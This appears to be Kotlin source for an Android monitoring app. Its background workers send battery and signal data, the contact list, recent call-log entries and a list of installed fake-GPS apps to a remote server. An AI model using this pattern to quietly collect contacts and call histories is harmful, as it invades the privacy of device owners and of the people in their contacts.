package com.rempc.app

import android.Manifest
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.content.pm.PackageManager.ApplicationInfoFlags
import android.content.pm.PackageManager.GET_META_DATA
import android.os.BatteryManager
import android.os.Build
import android.provider.CallLog
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.PermissionChecker.checkSelfPermission
import androidx.work.*
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.gson.Gson
import com.rempc.app.api.ApiClient
import com.rempc.app.contacts.*
import com.rempc.app.models.AppsBody
import com.rempc.app.models.CallLogBody
import com.rempc.app.models.LoggerBody
import kotlinx.coroutines.runBlocking
import org.jetbrains.annotations.Nullable

class DeviceStateWorker(private val context: Context, params: WorkerParameters) :
    Worker(context, params) {
    private val apiClient = ApiClient.getInstance().create(ApiClient::class.java)

    override fun doWork(): Result {
        val authToken = getAuthToken(context)
        return try {
            val batteryLevel = batteryPercentage(context).toString()
            val gsmLevel = getGsmSignalStrength(context).toString()
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "DeviceStateWorker",
                        "state" to "try",
                        "timestamp" to System.currentTimeMillis().toString()
                    )
                )
            ).execute()
            apiClient.updateDeviceState(
                authToken,
                batteryLevel,
                gsmLevel
            ).execute()
            Log.d("doWork", "done")
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "DeviceStateWorker",
                        "state" to "done",
                        "timestamp" to System.currentTimeMillis().toString()
                    )
                )
            ).execute()
            Result.success()
        } catch (e: Exception) {
            Log.d("doWork", "error")
            FirebaseCrashlytics.getInstance().recordException(e)
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "DeviceStateWorker",
                        "state" to "catch",
                        "timestamp" to System.currentTimeMillis().toString(),
                        "error" to e.toString()
                    )
                )
            ).execute()
            Result.retry()
        }
    }

    private fun batteryPercentage(context: Context): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun getGsmSignalStrength(context: Context): Int? {
        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            telephonyManager.signalStrength?.level
        } else {
            return -10
        }
    }
}

class ContactsSyncWorker(private val context: Context, params: WorkerParameters) :
    Worker(context, params) {
    private val apiClient = ApiClient.getInstance().create(ApiClient::class.java)
    override fun doWork(): Result {
        val authToken = getAuthToken(context)
        return try {
            getContacts()
            Log.d("doWork", "done")
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "ContactsSyncWorker",
                        "state" to "done",
                        "timestamp" to System.currentTimeMillis().toString()
                    )
                )
            ).execute()
            Result.success()
        } catch (e: Exception) {
            Log.d("doWork", "error")
            FirebaseCrashlytics.getInstance().recordException(e)
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "ContactsSyncWorker",
                        "state" to "catch",
                        "timestamp" to System.currentTimeMillis().toString(),
                        "error" to e.toString()
                    )
                )
            ).execute()
            Result.retry()
        }
    }

    private fun getContacts() {
        val authToken = getAuthToken(context)
        val checkStatus = checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
        if (checkStatus == PackageManager.PERMISSION_GRANTED) {
            val query = listOf(
                ContactField.DISPLAY_NAME,
                ContactField.PHONE_NUMBERS,
            )
            val contactsPlugin = FastContactsPlugin(context)
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "ContactsSyncWorker",
                        "state" to "try",
                        "timestamp" to System.currentTimeMillis().toString()
                    )
                )
            ).execute()
            runBlocking {
                contactsPlugin.fetchAllContacts(
                    context,
                    query,
                    getDeviceId(context),
                    getAuthToken(context)
                )
            }
        } else {
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "ContactsSyncWorker",
                        "state" to "PERMISSION_DENIED",
                        "timestamp" to System.currentTimeMillis().toString()
                    )
                )
            ).execute()
            FirebaseCrashlytics.getInstance()
                .log("ContactsSyncWorker permission READ_CONTACTS PERMISSION_DENIED")
        }
    }
}

class AppsSyncWorker(private val context: Context, params: WorkerParameters) :
    Worker(context, params) {
    private val apiClient = ApiClient.getInstance().create(ApiClient::class.java)

    override fun doWork(): Result {
        val authToken = getAuthToken(context)
        return try {
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "AppsSyncWorker",
                        "state" to "try",
                        "timestamp" to System.currentTimeMillis().toString()
                    )
                )
            ).execute()
            val apps = getInstalledGpsApps(context)
            syncApps(apps)
            Log.d("doWork Apps", "done")
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "AppsSyncWorker",
                        "state" to "done",
                        "timestamp" to System.currentTimeMillis().toString()
                    )
                )
            ).execute()
            Result.success()
        } catch (e: Exception) {
            Log.d("doWork Apps", "error")
            FirebaseCrashlytics.getInstance().recordException(e)
            apiClient.logEvent(
                authToken,
                LoggerBody(
                    "worker",
                    mapOf(
                        "name" to "AppsSyncWorker",
                        "state" to "catch",
                        "timestamp" to System.currentTimeMillis().toString(),
                        "error" to e.toString()
                    )
                )
            ).execute()
            Result.retry()
        }
    }

    private fun syncApps(apps: List<String>) {
        if (apps.isEmpty()) return
        apiClient.appsSync(
            token = getAuthToken(context),
            deviceId = getDeviceId(context),
            rawdata = true,
            apps = AppsBody(apps = Gson().toJson(apps)),
        ).execute()
    }
}

class CallLogWorker(private val context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {
    private val apiClient = ApiClient.getInstance().create(ApiClient::class.java)
    override fun doWork(): Result {
        return try {
            val callLogItems = getCallLog(applicationContext).map {
                it.toJson()
            }
            if (callLogItems.size > 100) {
                syncCalls(callLogItems.subList(0, 99))
            } else {
                syncCalls(callLogItems)
            }

            Result.success()
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
            Result.retry()
        }
    }

    private fun syncCalls(calls: List<Map<String, String>>) {
        val json = Gson().toJson(calls)
        Log.d("CALL WORKER", json)
        apiClient.callsSync(
            token = getAuthToken(context),
            deviceId = getDeviceId(context),
            calls = CallLogBody(calls = json),
        ).execute()
    }


    private fun getCallLog(context: Context): List<CallLogItem> {
        val callLogItems = mutableListOf<CallLogItem>()
        val contentResolver: ContentResolver = context.contentResolver
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )

        cursor?.use {
            val numberColumn = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeColumn = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateColumn = it.getColumnIndex(CallLog.Calls.DATE)
            val durationColumn = it.getColumnIndex(CallLog.Calls.DURATION)

            while (cursor.moveToNext()) {
                val phoneNumber = it.getString(numberColumn)
                val callType = it.getInt(typeColumn)
                val callDate = it.getLong(dateColumn)
                val callDuration = it.getLong(durationColumn)

                callLogItems.add(CallLogItem(phoneNumber, callType, callDate, callDuration))
            }
        }
        val lastCall = callLogItems.maxOfOrNull { it.callDate }
        val oldLastCallDate = retrieveLongValue(context, "last_call_date")
        storeLongValue(context, "last_call_date", lastCall)
        return callLogItems.filter { it.callDate > oldLastCallDate }
    }

    data class CallLogItem(
        val phoneNumber: String,
        val callType: Int,
        val callDate: Long,
        val callDuration: Long
    ) {
        fun toJson(): Map<String, String> {
            return mapOf(
                Pair("phoneNumber", phoneNumber),
                Pair("callType", callType.toString()),
                Pair("callDate", callDate.toString()),
                Pair("callDuration", callDuration.toString())
            )
        }
    }
}

@Nullable
private fun getAuthToken(context: Context): String {
    val sharedPref: SharedPreferences = context.getSharedPreferences(
        "helperService",
        Service.MODE_PRIVATE
    )
    val value = sharedPref.getString("userAuthToken", null)
    if (value != null && value != "") {
        return value
    }
    return ""
}

private fun getDeviceId(context: Context): String? {
    return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
}

fun storeJson(context: Context, key: String, obj: Any) {
    val prefs = context.getSharedPreferences("default", Context.MODE_PRIVATE)
    val editor = prefs.edit()

    val gson = Gson()
    val json = gson.toJson(obj)

    editor.putString(key, json).apply()
}

fun retrieveJson(context: Context, key: String, clazz: Class<*>): Any? {
    val prefs = context.getSharedPreferences("default", Context.MODE_PRIVATE)
    val json = prefs.getString(key, null) ?: return null

    val gson = Gson()
    return gson.fromJson(json, clazz)
}

fun storeLongValue(context: Context, key: String, value: Long?) {
    val prefs = context.getSharedPreferences("default", Context.MODE_PRIVATE)
    val editor = prefs.edit()

    if (value != null) {
        editor.putLong(key, value).apply()
    } else {
        editor.putLong(key, 0L).apply()
    }
}

fun retrieveLongValue(context: Context, key: String): Long {
    val prefs = context.getSharedPreferences("default", Context.MODE_PRIVATE)
    return prefs.getLong(key, 0L)
}

fun findNotEqualPairs(map1: Map<String, String>, map2: Map<String, String>): Map<String, String> {
    return map1.filter { entry ->
        map2[entry.key] != entry.value
    }
}

fun getInstalledGpsApps(context: Context): List<String> {
    val queries = listOf(
        "com.lexa.fakegps",
        "com.blogspot.newapphorizons.fakegps",
        "com.incorporateapps.fakegps.fre",
        "com.just4funtools.fakegpslocationprofessional",
        "com.rosteam.gpsemulator",
        "com.hopefactory2021.fakegpslocation",
        "com.incorporateapps.fakegps_route",
        "com.locationchanger",
        "location.changer.fake.gps.spoof.emulator",
        "ru.gavrikov.mocklocations",
        "com.gsmartstudio.fakegps",
        "com.lexa.fakegpsdonate",
        "com.ninja.toolkit.pulse.fake.gps.pro",
        "com.marlon.floating.fake.location",
        "com.evezzon.fakegps",
        "com.imyfone.anytoandroid",
        "fr.dvilleneuve.lockito",
        "com.appanchor.fakegps",
        "com.fakelocator.fakegpslocationspoofer",
        "com.fly.gps",
        "app.steve.fakeroute",
        "com.g_c.fakesnapmap",
        "com.wind.gpsfaker",
        "com.discipleskies.mock_location_spoofer",
        "com.foxbytecode.gpslocker",
        "com.theappninjas.fakegpsjoystick",
        "com.rasfar.mock.location",
        "project.listick.fakegps",
        "fake.gps.location",
        "com.mock.cartage",
    )
    return queries.filter { app ->
        context.packageManager?.getLaunchIntentForPackage(app) != null
    }
}

fun getApps(context: Context): Map<String, String> {
    val queries = listOf<String>(
        "com.lexa.fakegps",
        "com.blogspot.newapphorizons.fakegps",
        "com.incorporateapps.fakegps.fre",
        "com.just4funtools.fakegpslocationprofessional",
        "com.rosteam.gpsemulator",
        "com.hopefactory2021.fakegpslocation",
        "com.incorporateapps.fakegps_route",
        "com.locationchanger",
        "location.changer.fake.gps.spoof.emulator",
        "ru.gavrikov.mocklocations",
        "com.gsmartstudio.fakegps",
        "com.lexa.fakegpsdonate",
        "com.ninja.toolkit.pulse.fake.gps.pro",
        "com.marlon.floating.fake.location",
        "com.evezzon.fakegps",
        "com.imyfone.anytoandroid",
        "fr.dvilleneuve.lockito",
        "com.appanchor.fakegps",
        "com.fakelocator.fakegpslocationspoofer",
        "com.fly.gps",
        "app.steve.fakeroute",
        "com.g_c.fakesnapmap",
        "com.wind.gpsfaker",
        "com.discipleskies.mock_location_spoofer",
        "com.foxbytecode.gpslocker",
        "com.theappninjas.fakegpsjoystick",
        "com.rasfar.mock.location",
        "project.listick.fakegps",
        "fake.gps.location",
        "com.mock.cartage",
    )
    val packageManager = context.packageManager
    val mainIntent = Intent(Intent.ACTION_MAIN, null)
    mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)
    val installedApps = mutableMapOf<String, String>()
    try {
        val apps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            packageManager.getInstalledApplications(
                ApplicationInfoFlags.of(
                    GET_META_DATA.toLong()
                )
            )
        } else {
            packageManager.getInstalledApplications(GET_META_DATA)
        }
        val resolvedInfo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            packageManager.queryIntentActivities(
                mainIntent,
                PackageManager.ResolveInfoFlags.of(GET_META_DATA.toLong())
            )
        } else {
            packageManager.queryIntentActivities(mainIntent, GET_META_DATA)
        }
        for (appInfo in apps) {
            // Filter out system apps
            if (appInfo.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
                val packageName = appInfo.packageName
                val appTitle = packageManager.getApplicationLabel(appInfo).toString()
                if (queries.contains(packageName)) {
                    installedApps[packageName] = appTitle
                }
            }
        }
        for (app in resolvedInfo) {
            Log.d(
                AppsSyncWorker::class.qualifiedName,
                "RESOLVED ===> ${app.activityInfo.packageName}"
            )
        }
    } catch (e: Exception) {
        FirebaseCrashlytics.getInstance().recordException(e)
    }
    return installedApps
}